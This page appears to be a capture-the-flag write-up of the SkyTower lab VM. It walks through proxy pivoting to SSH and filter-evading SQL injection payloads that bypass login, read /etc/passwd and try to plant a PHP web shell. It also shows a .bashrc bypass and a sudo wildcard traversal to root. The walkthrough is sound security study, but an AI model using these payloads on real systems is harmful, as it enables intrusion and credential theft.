<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>Climbing the SkyTower | #!/bin/note
</title>
<meta name=keywords content>
<meta name=description content="foreword
Recently, at a local Security Conference, @telspacesystems ran a CTF. It was a classic &lsquo;read /root/flag.txt&rsquo; CTF hosted on a wireless network. Sadly the wifi sucked, a lot, and due to this and a flat battery I was not able to attempt this CTF properly at the con. Nonetheless, the VM was released on VulnHub, and was promptly downloaded and loaded into VirtualBox.
In summary, this CTF taught me some interesting things about SQL injection where filters are present. More specifically, commas were filtered out and resulted in the need from some creative thinking :)">
<meta name=author content="Leon Jacobs">
<link rel=canonical href=https://leonjza.github.io/blog/2014/07/17/climbing-the-skytower/>
<link crossorigin=anonymous href=/assets/css/stylesheet.min.5e2b4101351c21e906f398ae96901791830f58d430f96f2659dab7eaef7b3cb7.css integrity="sha256-XitBATUcIekG85iulpAXkYMPWNQw+W8mWdq36u97PLc=" rel="preload stylesheet" as=style>
<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://leonjza.github.io/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://leonjza.github.io/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=https://leonjza.github.io/favicon-32x32.png>
<link rel=apple-touch-icon href=https://leonjza.github.io/apple-touch-icon.png>
<link rel=mask-icon href=https://leonjza.github.io/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<meta name=generator content="Hugo 0.88.1">
<noscript>
<style>#theme-toggle,.top-link{display:none}</style>
<style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
</noscript>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script><meta property="og:title" content="Climbing the SkyTower">
<meta property="og:description" content="foreword
Recently, at a local Security Conference, @telspacesystems ran a CTF. It was a classic &lsquo;read /root/flag.txt&rsquo; CTF hosted on a wireless network. Sadly the wifi sucked, a lot, and due to this and a flat battery I was not able to attempt this CTF properly at the con. Nonetheless, the VM was released on VulnHub, and was promptly downloaded and loaded into VirtualBox.
In summary, this CTF taught me some interesting things about SQL injection where filters are present. More specifically, commas were filtered out and resulted in the need from some creative thinking :)">
<meta property="og:type" content="article">
<meta property="og:url" content="https://leonjza.github.io/blog/2014/07/17/climbing-the-skytower/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2014-07-17T18:20:12+00:00">
<meta property="article:modified_time" content="2014-07-17T18:20:12+00:00"><meta property="og:site_name" content="#!/bin/note
">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="Climbing the SkyTower">
<meta name=twitter:description content="foreword
Recently, at a local Security Conference, @telspacesystems ran a CTF. It was a classic &lsquo;read /root/flag.txt&rsquo; CTF hosted on a wireless network. Sadly the wifi sucked, a lot, and due to this and a flat battery I was not able to attempt this CTF properly at the con. Nonetheless, the VM was released on VulnHub, and was promptly downloaded and loaded into VirtualBox.
In summary, this CTF taught me some interesting things about SQL injection where filters are present. More specifically, commas were filtered out and resulted in the need from some creative thinking :)">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://leonjza.github.io/posts/"},{"@type":"ListItem","position":3,"name":"Climbing the SkyTower","item":"https://leonjza.github.io/blog/2014/07/17/climbing-the-skytower/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Climbing the SkyTower","name":"Climbing the SkyTower","description":"foreword Recently, at a local Security Conference, @telspacesystems ran a CTF. It was a classic \u0026lsquo;read /root/flag.txt\u0026rsquo; CTF hosted on a wireless network. Sadly the wifi sucked, a lot, and due to this and a flat battery I was not able to attempt this CTF properly at the con. Nonetheless, the VM was released on VulnHub, and was promptly downloaded and loaded into VirtualBox.\nIn summary, this CTF taught me some interesting things about SQL injection where filters are present. More specifically, commas were filtered out and resulted in the need from some creative thinking :)\n","keywords":[],"articleBody":"foreword Recently, at a local Security Conference, @telspacesystems ran a CTF. It was a classic ‘read /root/flag.txt’ CTF hosted on a wireless network. Sadly the wifi sucked, a lot, and due to this and a flat battery I was not able to attempt this CTF properly at the con. Nonetheless, the VM was released on VulnHub, and was promptly downloaded and loaded into VirtualBox.\nIn summary, this CTF taught me some interesting things about SQL injection where filters are present. More specifically, commas were filtered out and resulted in the need from some creative thinking :)\nstarting off The very first thing to do was get the IP assigned by my home router to the VM. Loaded this up into a web browser and saw the skytower web page as per the screenshots in the vulnhub entry. The IP I got was 192.168.137.242.\nThe home page presented you with a login screen and a 2.5MB ‘background.jpg’ image. Right in the beginning I was started off on the wrong path. I downloaded this background image and attempted to see if there was anything particularly interesting about it. Sadly, the answer to this question was a loud NOPE. I started dirbuster on the web interface and proceeded with a nmap scan of 192.168.137.242 after which I had to call it a night.\n$ nmap --reason -Pn 192.168.137.242 Starting Nmap 6.46 ( http://nmap.org ) at 2014-07-17 18:32 SAST Nmap scan report for 192.168.137.242 Host is up, received user-set (0.0020s latency). Not shown: 997 closed ports Reason: 997 conn-refused PORT STATE SERVICE REASON 22/tcp filtered ssh no-response 80/tcp open http syn-ack 3128/tcp open squid-http syn-ack Next morning I reviewed the results and continued to poke around.\nlearn all you can With the information gathered so far, I realized that the SSH (tcp/22) was explicitly filtered, however the squid proxy was open. I tried to telnet and use the CONNECT method to see if I was able to access the SSH service:\n$ telnet 192.168.137.242 3128 Trying 192.168.137.242... Connected to 192.168.137.242. Escape character is '^]'. CONNECT 127.0.0.1:22 HTTP/1.0 200 Connection established SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u1 ^] telnet quit Connection closed. Great, soooo I can get access to the SSH service of needed. The dirbuster results showed nothing of particular interest, but it was worth a shot anyways. An important thing to note here is that I suspect I maxed out the disk space in the VM due to the access_log growing too big from the dirbust. This caused me numerous headaches and frustrated me quite a bit when I was testing. Anyways…\nThe next step was to poke around the web application. I personally really enjoy web hacking so this was probably the most fun of the whole CTF. The web page presented you with a simple form that would POST to login.php. 2 fields were posted: email \u0026 password\nA natural reaction is to try and use a single quote in form fields as a quick and nasty check for potential SQL injection. A login attempt with a username of test and password ' resulted in:\nThere was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1] Classic SQLi! Surprised I continued with simple login bypasses. None that I could think of out of my head appeared to work. Eventually I started to notice that some of the keywords that I was using were not appearing in the error messages. This hinted heavily towards the fact that there may be some form of filtering in place. Eventually, I put the request down in a curl command so that I can work with this slightly easier. To sample the keywords being removed:\n$ curl --data \"email=foo@bar\u0026password=' OR 1=1#\" http://192.168.137.242/login.php There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '11#'' at line 1]% $ curl --data \"email=foo@bar\u0026password='1 OR 1=1#\" http://192.168.137.242/login.php There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1 11#'' at line 1]% Ok, so no OR. Thats ok, we can substitute this easily with ||.\n$ curl --data \"email=foo@bar\u0026password=' || 1=1#\" http://192.168.137.242/login.php HTML div style=\"height:100%; width:100%;background-image:url('background.jpg'); background-size:100%; background-position:50% 50%; background-repeat:no-repeat;\" div style=\" padding-right:8px; padding-left:10px; padding-top: 10px; padding-bottom: 10px; background-color:white; border-color: #000000; border-width: 5px; border-style: solid; width: 400px; height:430px; position:absolute; top:50%; left:50%; margin-top:-215px; /* this is half the height of your div*/ margin-left:-200px; \" brstrongfont size=4Welcome john@skytech.comfontbr / brstrongAs you may know, SkyTech has ceased all international operations.brbr To all our long term employees, we wish to convey our thanks for your dedication and hard work.brbrstrongUnfortunately, all international contracts, including yours have been terminated.strongbrbr The remainder of your contract and retirement fund, strong$2strong ,has been payed out in full to a secure account. For security reasons, you must login to the SkyTech server via SSH to access the account details.brbrstrongUsername: johnstrongbrstrongPassword: hereisjohnstrong brbr We wish you the best of luck in your future endeavors. br div divHTML% And success. We have made some progress :D Little did I know that I don’t actually completely understand the progress made yet, but just keep this in mind :)\nclimbing the tower and faling hard From the auth bypass results, we can see specific mention for users to SSH into the server. This particular user has a username john and a password hereisjohn. So lets try this. I setup my proxychains install to use the http proxy available on the server (http 192.168.137.242 3128) and opened a SSH session through it:\n$ proxychains4 ssh john@127.0.0.1 [snip] [proxychains] Strict chain ... 192.168.137.242:3128 ... 127.0.0.1:22 ... OK john@127.0.0.1's password: Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Thu Jul 17 12:54:32 2014 from localhost Funds have been withdrawn Connection to 127.0.0.1 closed. $ … ok. So we get a session, and are told Funds have been withdrawn, and get the connection closed. Not exactly what I hoped for. Thinking what could cause this behavior, my mind went on to things like a custom shell, .bashrc files (assuming the user has bash a a shell) etc. So, I figured there may be more users on the system and I should try get those credentials too. After all, we have a working SQL injection point.\nmore sql injection So back to the SQLi point it was. Taking a wild guess, I assumed there is a users table, and the table will have a primary key of id. So, john may have id 1, and a next user have id 2. So I modified the query slightly:\n$ curl --data \"email=foo@bar\u0026password=' || id=1#\" http://192.168.137.242/login.php There was an error running the query [Unknown column 'id1' in 'where clause']% Well I definitely didn’t ask for the column id1, but from this again it was apparent that = was filtered along with OR. :| Ok, so we change the payload again:\n$ curl --data \"email=foo@bar\u0026password=' || id  1#\" http://192.168.137.242/login.php [snip] =4Welcome sara@skytech.com\nAs you may know, SkyTech has ceased all international operations.\nTo all our long term employees, we wish to convey our thanks for your dedication and hard work.\nUnfortunately, all international contracts, including yours have been terminated.\nThe remainder of your contract and retirement fund, $2 ,has been payed out in full to a secure account. For security reasons, you must login to the SkyTech server via SSH to access the account details.\nUsername: sara\nPassword: ihatethisjob We wish you the best of luck in your future endeavors.  % Yay, my guess on the id column was correct, and I now had a second users details. I continued to increment the id, and ended up with 3 accounts:\n john:hereisjohn sara:ihatethisjob william:senseable  The users john \u0026 sara both had the same behavior when attempting login via SSH, and the user william appears to have had an incorrect password. So, again the results were not exactly what I hoped for.\nmore SQL enumeration At this stage, I was thinking there must be more information in the database, and I should try and read some files from disk in order to gain a better understanding of what is going on here.\nFast forward a few hours, I discovered that a few more keywords and symbols were filtered. The hardest being the realization that a union select was not working as expected so that I can enumerate the columns. Even though the initial entry on vulnhub mentioned that automated tools would probably not work, I figured in this case that I had a valid SQLi, I could just make use of some SQLMap automagic. Again NOPE. Even with --level 3 \u0026 --risk 3 there was no joy. This is ok.\nI studied the error messages in detail, googled… a lot… and eventually came across this blogpost, detailing a way to get a union working without the ability to use commas. I should also note that I managed to bypass the SELECT filter by using SELECSELECTT in the payload. Assuming that the filter was a simple str_replace(), this left me with SELECT after the pass.\nFor the sake of brevity I am not going to detail all of the methods I used in order to exploit the SQLi and get value out of it. I managed to learn that the database user used by the PHP application was root. The query used in login.php returned 3 columns. One particular payload of interest that uses the method in the previously mentioned blog post, was used to start reading files from the servers disk. More specifically, /etc/passwd:\n$ curl --data \"email=foo@bar\u0026password=' or union selecselectt * from (selecselectt 111) as a JOIN (selecselectt 222) as b JOIN (selecselectt load_file('/etc/password')) as c#\" http://192.168.137.242/login.php [snip] =4Welcome 222\nAs you may know, SkyTech has ceased all international operations.\nTo all our long term employees, we wish to convey our thanks for your dedication and hard work.\nUnfortunately, all international contracts, including yours have been terminated.\nThe remainder of your contract and retirement fund, $2 ,has been payed out in full to a secure account. For security reasons, you must login to the SkyTech server via SSH to access the account details.\nUsername: 222\nPassword: root❌0:0:root:/root:/bin/bash daemon❌1:1:daemon:/usr/sbin:/bin/sh bin❌2:2:bin:/bin:/bin/sh sys❌3:3:sys:/dev:/bin/sh sync❌4:65534:sync:/bin:/bin/sync games❌5:60:games:/usr/games:/bin/sh man❌6:12:man:/var/cache/man:/bin/sh lp❌7:7:lp:/var/spool/lpd:/bin/sh mail❌8:8:mail:/var/mail:/bin/sh news❌9:9:news:/var/spool/news:/bin/sh uucp❌10:10:uucp:/var/spool/uucp:/bin/sh proxy❌13:13:proxy:/bin:/bin/sh www-data❌33:33:www-data:/var/www:/bin/sh backup❌34:34:backup:/var/backups:/bin/sh list❌38:38:Mailing List Manager:/var/list:/bin/sh irc❌39:39:ircd:/var/run/ircd:/bin/sh gnats❌41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody❌65534:65534:nobody:/nonexistent:/bin/sh libuuid❌100:101::/var/lib/libuuid:/bin/sh sshd❌101:65534::/var/run/sshd:/usr/sbin/nologin mysql❌102:105:MySQL Server,,,:/nonexistent:/bin/false john❌1000:1000:john,,,:/home/john:/bin/bash sara❌1001:1001:,,,:/home/sara:/bin/bash william❌1002:1002:,,,:/home/william:/bin/bash  We wish you the best of luck in your future endeavors.   Reading the /etc/passwd revealed that there were no custom shells used for the users that were enumerated previously. O..k.. I also pulled the sources of login.php in order to understand what the deal with the filtering was:\n$sqlinjection = array(\"SELECT\", \"TRUE\", \"FALSE\", \"--\",\"OR\", \"=\", \",\", \"AND\", \"NOT\"); $email = str_ireplace($sqlinjection, \"\", $_POST['email']); $password = str_ireplace($sqlinjection, \"\", $_POST['password']); And as suspected. :)\nOne last thing that I tried, really hard, was to get a web shell on the server so that I can further explore the environment. This failed miserably. The closest I was able to get was:\n$ curl --data \"email=foo@bar\u0026password=' or union selecselectt * from (selecselectt 111) as a JOIN (selecselectt 222) as b JOIN (selecselectt '$_GET[cmd])); ?') as c into outfile '/var/www/shell.php'#\" http://192.168.137.242/login.php There was an error running the query [Can't create/write to file '/var/www/shell.php' (Errcode: 13)] This obviously alludes to the fact that the user MySQL is running as des not have access to write to the web folder. It was time to rethink what was going on here… Oh yes, I obviously tried to just cat /root/flag.txt, but didn’t expect it to be that easy :D\ngaining further access After spending a really long time with the SQL injections, I decided to relook the SSH section. From the SQL injection that I learnt that there don’t appear to be any custom shells in use, so the other thing this could be is a .bashrc with a exit command. I know its .bashrc because I saw the shell is /bin/bash from the /etc/passwd. I remember that I make heavy use of ssh -t to execute commands on the remove server, usually to setup multiple tunnels into a network, so I thought it will come in handy here.\nFor this case though, I though I’d specify a /bin/sh as the command to run, hoping to not get caught in a .bashrc running:\n$ proxychains4 -q ssh john@127.0.0.1 -t /bin/sh john@127.0.0.1's password: $ id uid=1000(john) gid=1000(john) groups=1000(john) Woop! I was now logged in as john. I inspected the .bashrc file and saw that at the end there was:\necho echo \"Funds have been withdrawn\" exit … a exit. I simply removed the line. Now the almost obvious next step was to inspect and enumerate as much as possible. The most obvious thing that came to mind was privilege escalation as I was simply a normal user on the system at the moment.\nenumeration enumeration enumeration I enumerated, everything… Referring to a excellent post by g0tm1lk nothing aparent came up. The only semi strange thing was a empty /accounts/ directory:\njohn@SkyTower:/accounts$ ls -lah /accounts/ total 8.0K drwxr-xr-x 2 root root 4.0K Jun 20 07:52 . drwxr-xr-x 24 root root 4.0K Jun 20 07:52 .. Other than that things seemed pretty normal. I decided to check out the other user sara too. This user has a similar exit in the .bashrc which I just removed. There was one distinct difference during enumeration though…\nsara@SkyTower:~$ sudo -l Matching Defaults entries for sara on this host: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User sara may run the following commands on this host: (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/* This user may execute some commands as root using sudo. sudo allows you to specify what those commands are, if not all. There was one problem with this configuration though. * is a wildcard character, and as such, anything after cat /accounts/ may also be run. This means that things like sudo cat /accounts/../../etc/shadow will work as the wildcard allows us to do a form of directory traversal.\npwnd So, to complete SkyTower:\nsara@SkyTower:~$ sudo cat /accounts/../../root/flag.txt Congratz, have a cold one to celebrate! root password is theskytower Thanks to @telspacesystems for the fun experience. I learnt something so for this was totally worth it!\n","wordCount":"2447","inLanguage":"en","datePublished":"2014-07-17T18:20:12Z","dateModified":"2014-07-17T18:20:12Z","author":{"@type":"Person","name":"Leon Jacobs"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://leonjza.github.io/blog/2014/07/17/climbing-the-skytower/"},"publisher":{"@type":"Organization","name":"#!/bin/note\n","logo":{"@type":"ImageObject","url":"https://leonjza.github.io/favicon.ico"}}}</script>
</head>
<body id=top>
<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
<header class=header>
<nav class=nav>
<div class=logo>
<a href=https://leonjza.github.io accesskey=h title="#!/bin/note
 (Alt + H)">#!/bin/note
</a>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
</span>
</div>
<ul id=menu>
<li>
<a href=https://leonjza.github.io/about/ title="About Me">
<span>About Me</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/archives title=Archive>
<span>Archive</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/categories title=Categories>
<span>Categories</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/search/ title="Search (Alt + /)" accesskey=/>
<span>Search</span>
</a>
</li>
</ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<div class=breadcrumbs><a href=https://leonjza.github.io>Home</a>&nbsp;»&nbsp;<a href=https://leonjza.github.io/posts/>Posts</a></div>
<h1 class=post-title>
Climbing the SkyTower
</h1>
<div class=post-meta>July 17, 2014&nbsp;·&nbsp;12 min&nbsp;·&nbsp;Leon Jacobs&nbsp;|&nbsp;<a href=https://github.com/leonjza/leonjza.github.io/tree/source/content/posts/2014-07-17-climbing-the-skytower.markdown rel="noopener noreferrer" target=_blank>Suggest Changes</a>
</div>
</header> <div class=toc>
<details>
<summary accesskey=c title="(Alt + C)">
<span class=details>Table of Contents</span>
</summary>
<div class=inner><ul>
<li>
<a href=#foreword aria-label=foreword>foreword</a></li>
<li>
<a href=#starting-off aria-label="starting off">starting off</a></li>
<li>
<a href=#learn-all-you-can aria-label="learn all you can">learn all you can</a></li>
<li>
<a href=#climbing-the-tower-and-faling-hard aria-label="climbing the tower and faling hard">climbing the tower and faling hard</a></li>
<li>
<a href=#more-sql-injection aria-label="more sql injection">more sql injection</a></li>
<li>
<a href=#more-sql-enumeration aria-label="more SQL enumeration">more SQL enumeration</a></li>
<li>
<a href=#gaining-further-access aria-label="gaining further access">gaining further access</a></li>
<li>
<a href=#enumeration-enumeration-enumeration aria-label="enumeration enumeration enumeration">enumeration enumeration enumeration</a></li>
<li>
<a href=#pwnd aria-label=pwnd>pwnd</a>
</li>
</ul>
</div>
</details>
</div>
<div class=post-content><h2 id=foreword>foreword<a hidden class=anchor aria-hidden=true href=#foreword>#</a></h2>
<p>Recently, at a local Security Conference, <a href=https://twitter.com/telspacesystems>@telspacesystems</a> ran a CTF. It was a classic &lsquo;read /root/flag.txt&rsquo; CTF hosted on a wireless network. Sadly the wifi sucked, a lot, and due to this and a flat battery I was not able to attempt this CTF properly at the con. Nonetheless, the VM was released on <a href=http://vulnhub.com/entry/skytower-1,96/>VulnHub</a>, and was promptly downloaded and loaded into VirtualBox.</p>
<p>In summary, this CTF taught me some interesting things about SQL injection where filters are present. More specifically, commas were filtered out and resulted in the need from some creative thinking :)</p>
<h2 id=starting-off>starting off<a hidden class=anchor aria-hidden=true href=#starting-off>#</a></h2>
<p>The very first thing to do was get the IP assigned by my home router to the VM. Loaded this up into a web browser and saw the skytower web page as per the screenshots in the vulnhub entry. The IP I got was 192.168.137.242.</p>
<p>The home page presented you with a login screen and a 2.5MB &lsquo;background.jpg&rsquo; image. Right in the beginning I was started off on the wrong path. I downloaded this background image and attempted to see if there was anything particularly interesting about it. Sadly, the answer to this question was a loud <em>NOPE</em>. I started dirbuster on the web interface and proceeded with a nmap scan of 192.168.137.242 after which I had to call it a night.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ nmap --reason -Pn 192.168.137.242

Starting Nmap 6.46 <span style=color:#f92672>(</span> http://nmap.org <span style=color:#f92672>)</span> at 2014-07-17 18:32 SAST
Nmap scan report <span style=color:#66d9ef>for</span> 192.168.137.242
Host is up, received user-set <span style=color:#f92672>(</span>0.0020s latency<span style=color:#f92672>)</span>.
Not shown: <span style=color:#ae81ff>997</span> closed ports
Reason: <span style=color:#ae81ff>997</span> conn-refused
PORT     STATE    SERVICE    REASON
22/tcp   filtered ssh        no-response
80/tcp   open     http       syn-ack
3128/tcp open     squid-http syn-ack
</code></pre></div><p>Next morning I reviewed the results and continued to poke around.</p>
<h2 id=learn-all-you-can>learn all you can<a hidden class=anchor aria-hidden=true href=#learn-all-you-can>#</a></h2>
<p>With the information gathered so far, I realized that the SSH (tcp/22) was explicitly filtered, however the squid proxy was open. I tried to telnet and use the CONNECT method to see if I was able to access the SSH service:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ telnet 192.168.137.242 <span style=color:#ae81ff>3128</span>
Trying 192.168.137.242...
Connected to 192.168.137.242.
Escape character is <span style=color:#e6db74>&#39;^]&#39;</span>.
CONNECT 127.0.0.1:22
HTTP/1.0 <span style=color:#ae81ff>200</span> Connection established

SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u1
^<span style=color:#f92672>]</span>
telnet&gt; quit
Connection closed.
</code></pre></div><p>Great, soooo I can get access to the SSH service of needed. The dirbuster results showed nothing of particular interest, but it was worth a shot anyways. An important thing to note here is that I suspect I maxed out the disk space in the VM due to the access_log growing too big from the dirbust. This caused me numerous headaches and frustrated me quite a bit when I was testing. Anyways&mldr;</p>
<p>The next step was to poke around the web application. I personally really enjoy web hacking so this was probably the most fun of the whole CTF. The web page presented you with a simple form that would POST to <code>login.php</code>. 2 fields were posted: <code>email</code> & <code>password</code></p>
<p>A natural reaction is to try and use a single quote in form fields as a quick and nasty check for potential SQL injection. A login attempt with a username of test and password <code>'</code> resulted in:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>There was an error running the query <span style=color:#f92672>[</span>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version <span style=color:#66d9ef>for</span> the right syntax to use near <span style=color:#e6db74>&#39;&#39;&#39;&#39;</span><span style=color:#960050;background-color:#1e0010>&#39;</span> at line 1<span style=color:#f92672>]</span>
</code></pre></div><p>Classic SQLi! Surprised I continued with simple login bypasses. None that I could think of out of my head appeared to work. Eventually I started to notice that some of the keywords that I was using were not appearing in the error messages. This hinted heavily towards the fact that there may be some form of filtering in place. Eventually, I put the request down in a curl command so that I can work with this slightly easier. To sample the keywords being removed:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ curl --data <span style=color:#e6db74>&#34;email=foo@bar&amp;password=&#39; OR 1=1#&#34;</span> http://192.168.137.242/login.php
There was an error running the query <span style=color:#f92672>[</span>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version <span style=color:#66d9ef>for</span> the right syntax to use near <span style=color:#e6db74>&#39;11#&#39;&#39; at line 1]%
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>$ curl --data &#34;email=foo@bar&amp;password=&#39;</span><span style=color:#ae81ff>1</span> OR 1<span style=color:#f92672>=</span>1#<span style=color:#e6db74>&#34; http://192.168.137.242/login.php
</span><span style=color:#e6db74>There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;1  11#&#39;&#39; at line 1]%
</span></code></pre></div><p>Ok, so no <code>OR</code>. Thats ok, we can substitute this easily with <code>||</code>.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>$ curl --data &#34;email=foo@bar<span style=color:#960050;background-color:#1e0010>&amp;</span>password=&#39; || 1=1#&#34; http://192.168.137.242/login.php
&lt;<span style=color:#f92672>HTML</span>&gt;
      &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>style</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;height:100%; width:100%;background-image:url(&#39;background.jpg&#39;);
</span><span style=color:#e6db74>                                background-size:100%;
</span><span style=color:#e6db74>                                background-position:50% 50%;
</span><span style=color:#e6db74>                                background-repeat:no-repeat;&#34;</span>&gt;
      &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>style</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;
</span><span style=color:#e6db74>        padding-right:8px;
</span><span style=color:#e6db74>              padding-left:10px;
</span><span style=color:#e6db74>        padding-top: 10px;
</span><span style=color:#e6db74>              padding-bottom: 10px;
</span><span style=color:#e6db74>                  background-color:white;
</span><span style=color:#e6db74>                  border-color: #000000;
</span><span style=color:#e6db74>                  border-width: 5px;
</span><span style=color:#e6db74>                  border-style: solid;
</span><span style=color:#e6db74>                  width: 400px;
</span><span style=color:#e6db74>                  height:430px;
</span><span style=color:#e6db74>                  position:absolute;
</span><span style=color:#e6db74>                  top:50%;
</span><span style=color:#e6db74>                  left:50%;
</span><span style=color:#e6db74>                  margin-top:-215px; /* this is half the height of your div*/
</span><span style=color:#e6db74>                  margin-left:-200px;
</span><span style=color:#e6db74>                                &#34;</span>&gt;
   &lt;<span style=color:#f92672>br</span>&gt;&lt;<span style=color:#f92672>strong</span>&gt;&lt;<span style=color:#f92672>font</span> <span style=color:#a6e22e>size</span><span style=color:#f92672>=</span><span style=color:#e6db74>4</span>&gt;Welcome john@skytech.com&lt;/<span style=color:#f92672>font</span>&gt;&lt;<span style=color:#f92672>br</span> /&gt; &lt;/<span style=color:#f92672>br</span>&gt;&lt;/<span style=color:#f92672>strong</span>&gt;As you may know, SkyTech has ceased all international operations.&lt;<span style=color:#f92672>br</span>&gt;&lt;<span style=color:#f92672>br</span>&gt; To all our long term employees, we wish to convey our thanks for your dedication and hard work.&lt;<span style=color:#f92672>br</span>&gt;&lt;<span style=color:#f92672>br</span>&gt;&lt;<span style=color:#f92672>strong</span>&gt;Unfortunately, all international contracts, including yours have been terminated.&lt;/<span style=color:#f92672>strong</span>&gt;&lt;<span style=color:#f92672>br</span>&gt;&lt;<span style=color:#f92672>br</span>&gt; The remainder of your contract and retirement fund, &lt;<span style=color:#f92672>strong</span>&gt;$2&lt;/<span style=color:#f92672>strong</span>&gt; ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.&lt;<span style=color:#f92672>br</span>&gt;&lt;<span style=color:#f92672>br</span>&gt;&lt;<span style=color:#f92672>strong</span>&gt;Username: john&lt;/<span style=color:#f92672>strong</span>&gt;&lt;<span style=color:#f92672>br</span>&gt;&lt;<span style=color:#f92672>strong</span>&gt;Password: hereisjohn&lt;/<span style=color:#f92672>strong</span>&gt; &lt;<span style=color:#f92672>br</span>&gt;&lt;<span style=color:#f92672>br</span>&gt; We wish you the best of luck in your future endeavors. &lt;<span style=color:#f92672>br</span>&gt; &lt;/<span style=color:#f92672>div</span>&gt; &lt;/<span style=color:#f92672>div</span>&gt;&lt;/<span style=color:#f92672>HTML</span>&gt;%
